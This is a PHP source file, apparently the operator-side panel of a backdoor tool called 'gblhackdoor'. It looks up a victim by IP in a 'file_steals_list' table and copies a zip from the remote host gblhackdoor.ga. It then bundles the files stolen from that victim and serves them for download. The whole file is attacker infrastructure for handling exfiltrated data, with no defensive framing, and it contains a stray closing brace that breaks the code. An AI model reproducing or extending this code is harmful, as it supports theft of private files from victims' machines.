<?php
include('../class/include.php');
if (!Account::isAuthentified())
{
    die("Bad request");
}

$all_fsdl_predata = Server::GetAllFileStealtodl();
$ipl = $GLOBALS['DB']->GetContent('file_steals_list', ['id' => $_GET['ip']])[0]['ip'];

if(!@copy('http://gblhackdoor.ga/core/ajax/filesteal_c.zip','filesteal.zip'))
{
    $errors= error_get_last();
    echo "COPY ERROR: ".$errors['type'];
    echo "<br />\n".$errors['message'];
} else {
    echo "File copied from remote!";
}

$zip = new ZipArchive;

$zip->open('filesteal.zip', ZIPARCHIVE::CREATE | ZIPARCHIVE::OVERWRITE);

foreach ($all_fsdl_predata as $data)
{    
	if($data['ip'] == $ipl){

			$zip->addEmptyDir($data['folder']);

			$zip->addFromString($data['folder'].$data['name'], $data['content']);

    		$zip->addFile("/".$data['folder'].$data['name']);
 
	}
}
}

$zip->close();

header('Content-Type: application/zip');
header('Content-disposition: attachment; filename='."filesteal.zip");
header('Content-Length: ' . filesize("filesteal.zip"));
readfile("filesteal.zip");
?>